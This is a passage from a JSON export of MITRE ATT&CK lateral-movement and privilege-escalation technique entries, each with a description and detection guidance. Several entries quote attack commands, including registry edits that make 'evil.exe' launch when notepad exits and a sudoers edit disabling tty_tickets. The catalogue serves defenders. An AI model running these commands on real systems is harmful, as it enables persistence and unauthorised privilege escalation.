Shares","sort_id":0,"external_id":"T1021.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":25,"description":"<p>Adversaries may use <a href=\"https:\/\/attack.mitre.org\/techniques\/T1078\">Valid Accounts<\/a> to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.<\/p>\n<p>SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.<\/p>\n<p>Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include <code>C$<\/code>, <code>ADMIN$<\/code>, and <code>IPC$<\/code>. Adversaries may use this technique in conjunction with administrator-level <a href=\"https:\/\/attack.mitre.org\/techniques\/T1078\">Valid Accounts<\/a> to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB\/RPC are <a href=\"https:\/\/attack.mitre.org\/techniques\/T1053\">Scheduled Task\/Job<\/a>, <a href=\"https:\/\/attack.mitre.org\/techniques\/T1569\/002\">Service Execution<\/a>, and <a href=\"https:\/\/attack.mitre.org\/techniques\/T1047\">Windows Management Instrumentation<\/a>. Adversaries can also use NTLM hashes to access administrator shares on systems with <a href=\"https:\/\/attack.mitre.org\/techniques\/T1550\/002\">Pass the Hash<\/a> and certain configuration and patch levels.(Citation: Microsoft Admin Shares)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success\/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding. (Citation: Lateral Movement Payne)(Citation: Windows Event Forwarding Payne) Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [Net](https:\/\/attack.mitre.org\/software\/S0039), on the command-line interface and Discovery techniques that could be used to find remotely accessible systems.(Citation: Medium Detecting WMI Persistence)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":734,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":736,"name":"T1021.004 - SSH","sort_id":0,"external_id":"T1021.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":25,"description":"<p>Adversaries may use <a href=\"https:\/\/attack.mitre.org\/techniques\/T1078\">Valid Accounts<\/a> to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.<\/p>\n<p>SSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user\u2019s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.(Citation: SSH Secure Shell)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Use of SSH may be legitimate depending on the environment and how it\u2019s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with SSH. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":736,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":736,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":738,"name":"T1563.001 - SSH Hijacking","sort_id":0,"external_id":"T1563.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":25,"description":"<p>Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.<\/p>\n<p>In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.(Citation: Slideshare Abusing SSH)(Citation: SSHjack Blackhat)(Citation: Clockwork SSH Agent Hijacking)(Citation: Breach Post-mortem SSH Hijack)<\/p>\n<p><a href=\"https:\/\/attack.mitre.org\/techniques\/T1563\/001\">SSH Hijacking<\/a> differs from use of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1021\/004\">SSH<\/a> because it hijacks an existing SSH session rather than creating a new session using <a href=\"https:\/\/attack.mitre.org\/techniques\/T1078\">Valid Accounts<\/a>.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Use of SSH may be legitimate, depending upon the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with SSH. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time. Also monitor user SSH-agent socket files being used by different users.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":738,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":738,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":785,"name":"T1021.005 - VNC","sort_id":0,"external_id":"T1021.005","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":25,"description":"<p>Adversaries may use <a href=\"https:\/\/attack.mitre.org\/techniques\/T1078\">Valid Accounts<\/a> to remotely control machines using Virtual Network Computing (VNC). The adversary may then perform actions as the logged-on user.<\/p>\n<p>VNC is a desktop sharing system that allows users to remotely control another computer\u2019s display by relaying mouse and keyboard inputs over the network. VNC does not necessarily use standard user credentials. Instead, a VNC client and server may be configured with sets of credentials that are used only for VNC connections.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Use of VNC may be legitimate depending on the environment and how it\u2019s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with VNC.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":785,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":785,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":785,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":794,"name":"T1021.006 - Windows Remote Management","sort_id":0,"external_id":"T1021.006","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":25,"description":"<p>Adversaries may use <a href=\"https:\/\/attack.mitre.org\/techniques\/T1078\">Valid Accounts<\/a> to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.<\/p>\n<p>WinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).(Citation: Microsoft WinRM) It may be called with the <code>winrm<\/code> command or by any number of programs such as PowerShell.(Citation: Jacobsen 2014)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor use of WinRM within an environment by tracking service execution. If it is not normally used or is disabled, then this may be an indicator of suspicious behavior. Monitor processes created and actions taken by the WinRM process or a WinRM invoked script to correlate it with other related events.(Citation: Medium Detecting Lateral Movement)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":794,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]}]},{"id":27,"name":"Privilege Escalation","source_name":"ENTERPRISE_privilege-escalation","sort_id":0,"external_id":"TA0004","category_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"framework_stage_id":17,"tactic_id":27},"techniques":[{"id":228,"name":"T1514 - Elevated Execution with Prompt","sort_id":0,"external_id":"T1514","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating.  This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.<\/p>\n<p>Adversaries may abuse AuthorizationExecuteWithPrivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with <a href=\"https:\/\/attack.mitre.org\/techniques\/T1036\">Masquerading<\/a> to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it's all broken!)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":228,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":243,"name":"T1068 - Exploitation for Privilege Escalation","sort_id":0,"external_id":"T1068","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>Adversaries may exploit software vulnerabilities in an attempt to collect elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.<\/p>\n<p>When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This may be a necessary step for an adversary compromising a endpoint system that has been properly configured and limits other privilege escalation methods.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the processes. This could include suspicious files written to disk, evidence of [Process Injection](https:\/\/attack.mitre.org\/techniques\/T1055) for attempts to hide execution or evidence of Discovery.\n\nHigher privileges are often necessary to perform additional actions such as some methods of [OS Credential Dumping](https:\/\/attack.mitre.org\/techniques\/T1003). Look for additional activity that may indicate an adversary has gained higher privileges.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":243,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":243,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":243,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":265,"name":"T1183 - Image File Execution Options Injection","sort_id":0,"external_id":"T1183","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>Image File Execution Options (IFEO) enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application\u2019s IFEO will be prepended to the application\u2019s name, effectively launching the new process under the debugger (e.g., \u201cC:\\dbg\\ntsd.exe -g  notepad.exe\u201d). (Citation: Microsoft Dev Blog IFEO Mar 2010)<\/p>\n<p>IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger<\/code> values in the Registry under <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable><\/code> where <code><executable><\/code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)<\/p>\n<p>IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and\/or by directly modifying IEFO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\<\/code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)<\/p>\n<p>An example where the evil.exe process is started when notepad.exe exits: (Citation: Oddvar Moe IFEO APR 2018)<\/p>\n<ul>\n<li><code>reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe&quot; \/v GlobalFlag \/t REG_DWORD \/d 512<\/code><\/li>\n<li><code>reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe&quot; \/v ReportingMode \/t REG_DWORD \/d 1<\/code><\/li>\n<li><code>reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe&quot; \/v MonitorProcess \/d &quot;C:\\temp\\evil.exe&quot;<\/code><\/li>\n<\/ul>\n<p>Similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1055\">Process Injection<\/a>, these values may be abused to obtain persistence and privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Endgame Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous invocation.<\/p>\n<p>Malware may also use IFEO for Defense Evasion by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":265,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":345,"name":"T1178 - SID-History Injection","sort_id":0,"external_id":"T1178","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).<\/p>\n<p>Adversaries may use this mechanism for privilege escalation. With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users\/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and\/or access to otherwise inaccessible domains via lateral movement techniques such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1021\">Remote Services<\/a>, <a href=\"https:\/\/attack.mitre.org\/techniques\/T1077\">Windows Admin Shares<\/a>, or <a href=\"https:\/\/attack.mitre.org\/techniques\/T1028\">Windows Remote Management<\/a>.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":345,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":360,"name":"T1166 - Setuid and Setgid","sort_id":0,"external_id":"T1166","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>When the setuid or setgid bits are set on Linux or macOS for an application, this means that the application will run with the privileges of the owning user or group respectively  (Citation: setuid man page). Normally an application is run in the current user\u2019s context, regardless of which user or group owns the application. There are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn\u2019t need the elevated privileges. Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an &quot;s&quot; instead of an &quot;x&quot; when viewing a file's attributes via <code>ls -l<\/code>. The <code>chmod<\/code> program can set these bits with via bitmasking, <code>chmod 4777 [file]<\/code> or via shorthand naming, <code>chmod u+s [file]<\/code>.<\/p>\n<p>An adversary can take advantage of this to either do a shell escape or exploit a vulnerability in an application with the setsuid or setgid bits to get code running in a different user\u2019s context. Additionally, adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future  (Citation: OSX Keydnap malware).<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":360,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":360,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":379,"name":"T1169 - Sudo","sort_id":0,"external_id":"T1169","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>The sudoers file, <code>\/etc\/sudoers<\/code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the idea of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL<\/code> (Citation: OSX.Dok Malware). <\/p>\n<p>Adversaries can take advantage of these configurations to execute commands as other users or spawn processes with higher privileges. You must have elevated privileges to edit this file though.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":379,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":379,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":380,"name":"T1206 - Sudo Caching","sort_id":0,"external_id":"T1206","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>The <code>sudo<\/code> command &quot;allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.&quot; (Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout<\/code> that is the amount of time in minutes between instances of <code>sudo<\/code> before it will re-prompt for a password. This is because <code>sudo<\/code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>\/var\/db\/sudo<\/code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets<\/code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).<\/p>\n<p>Adversaries can abuse poor configurations of this to escalate privileges without needing the user's password. <code>\/var\/db\/sudo<\/code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout<\/code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. When <code>tty_tickets<\/code> is disabled, adversaries can do this from any tty for that user. <\/p>\n<p>The OSX Proton Malware has disabled <code>tty_tickets<\/code> to potentially make scripting easier by issuing <code>echo \\'Defaults !tty_tickets\\' &gt;&gt; \/etc\/sudoers<\/code>  (Citation: cybereason osx proton). In order for this change to be reflected, the Proton malware also must issue <code>killall Terminal<\/code>. As of macOS Sierra, the sudoers file has <code>tty_tickets<\/code> enabled by default.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":380,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":380,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":450,"name":"T1404 - Exploit OS Vulnerability","sort_id":0,"external_id":"T1404","external_sub_id":null,"old_external_id":"MOB-T1007","old_external_sub_id":null,"tactic_id":27,"description":"<p>A malicious app can exploit unpatched vulnerabilities in the operating system to obtain escalated privileges.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":450,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":450,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":495,"name":"T1546.004 - .bash_profile and .bashrc","sort_id":0,"external_id":"T1546.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>Adversaries may establish persistence by executing malicious content triggered by a user\u2019s shell. <code>~\/.bash_profile<\/code> and <code>~\/.bashrc<\/code> are shell scripts that contain shell commands. These files are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly.<\/p>\n<p><code>~\/.bash_profile<\/code> is executed for login shells and <code>~\/.bashrc<\/code> is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), the <code>~\/.bash_profile<\/code> script is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, the <code>~\/.bashrc<\/code> script is executed. This allows users more fine-grained control over when they want certain commands executed. These shell scripts are meant to be written to by the local user to configure their own environment.<\/p>\n<p>The macOS Terminal.app is a little different in that it runs a login shell by default each time a new terminal window is opened, thus calling <code>~\/.bash_profile<\/code> each time instead of <code>~\/.bashrc<\/code>.<\/p>\n<p>Adversaries may abuse these shell scripts by inserting arbitrary shell commands that may be used to execute other binaries to gain persistence. Every time the user logs in or opens a new shell, the modified ~\/.bash_profile and\/or ~\/.bashrc scripts will be executed.(Citation: amnesia malware)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"While users may customize their <code>~\/.bashrc<\/code> and <code>~\/.bash_profile<\/code> files , there are only certain types of commands that typically appear in these files. Monitor for abnormal commands such as execution of unknown programs, opening network sockets, or reaching out across the network when user profiles are loaded during the login process.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":495,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":495,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":497,"name":"T1548 - Abuse Elevation Control Mechanism","sort_id":0,"external_id":"T1548","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor the file system for files that have the setuid or setgid bits set. Also look for any process API calls for behavior that may be indicative of [Process Injection](https:\/\/attack.mitre.org\/techniques\/T1055) and unusual loaded DLLs through [DLL Search Order Hijacking](https:\/\/attack.mitre.org\/techniques\/T1574\/001), which indicate attempts to gain access to higher privileged processes. On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo).\n\nConsider monitoring for <code>\/usr\/libexec\/security_authtrampoline<\/code> executions which may indicate that AuthorizationExecuteWithPrivileges is being executed. MacOS system logs may also indicate when AuthorizationExecuteWithPrivileges is being called. Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling.\n\nOn Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo). This technique is abusing normal functionality in macOS and Linux systems, but sudo has the ability to log all input and output based on the <code>LOG_INPUT<\/code> and <code>LOG_OUTPUT<\/code> directives in the <code>\/etc\/sudoers<\/code> file.\n\nThere are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. Analysts should monitor Registry settings for unauthorized changes.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":497,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":497,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":497,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":498,"name":"T1546.008 - Accessibility Features","sort_id":0,"external_id":"T1546.008","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":27,"description":"<p>Adversaries may establish persistence and\/or elevate privileges by executing malicious content triggered by accessibility 